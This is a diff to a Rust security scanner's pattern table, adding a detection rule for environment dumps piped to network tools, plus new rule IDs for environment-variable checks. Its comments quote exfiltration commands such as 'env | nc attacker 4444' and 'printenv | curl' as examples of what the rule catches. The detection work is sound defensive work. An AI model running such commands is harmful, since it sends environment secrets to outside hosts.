@@ -722,6 +722,22 @@ const PATTERN_TABLE: &[PatternEntry] = &[
         notes: "Sudo invocations for escalation-gate detection (M8 ch4)",
     },
     PatternEntry {
+        id: "env_to_network_sink",
+        // M9 ch4 — `printenv` / `env` piped to a network sink
+        // (`curl`/`wget`/`nc`). A `printenv | curl https://x` already passes
+        // tier-1 via `standard_url` (the `://`), but `env | nc attacker 4444`
+        // has no URL and `nc` is not in the pipe-to-interpreter alternation —
+        // so this coarse probe is the tier-1 admission ticket for the no-URL
+        // network-sink shape. The precise "source is an env dump AND the sink
+        // is a network tool reached by a pipe" check lives in
+        // `env_guard::check_printenv_to_network_sink`. `\bprintenv\b` /
+        // `\benv\b` keep `printenvironment` and `environment` out of the hit
+        // list; the rule re-verifies the leader token anyway.
+        tier1_exec_fragments: &[r"\b(?:printenv|env)\b\s*\|"],
+        tier1_paste_only_fragments: &[],
+        notes: "printenv/env piped to a network sink (M9 ch4)",
+    },
+    PatternEntry {
         id: "prompt_injection_seed",
         // M7 ch5 — paste-only fast gate for the prompt-injection rule.
         //
@@ -1176,6 +1192,16 @@ const EXPECTED_RULES: &[(&str, &str)] = &[
         "AliasContainsCredentialRead",
     ),
     ("alias_recently_added", "AliasRecentlyAdded"),
+    // Environment-variable lifecycle rules (M9 ch4).
+    (
+        "env_sensitive_exposed_to_unknown_script",
+        "EnvSensitiveExposedToUnknownScript",
+    ),
+    (
+        "env_sensitive_persisted_in_shell_rc",
+        "EnvSensitivePersistedInShellRc",
+    ),
+    ("env_printenv_to_network_sink", "EnvPrintenvToNetworkSink"),
 ];
 
 const VALID_CATEGORIES: &[&str] = &[
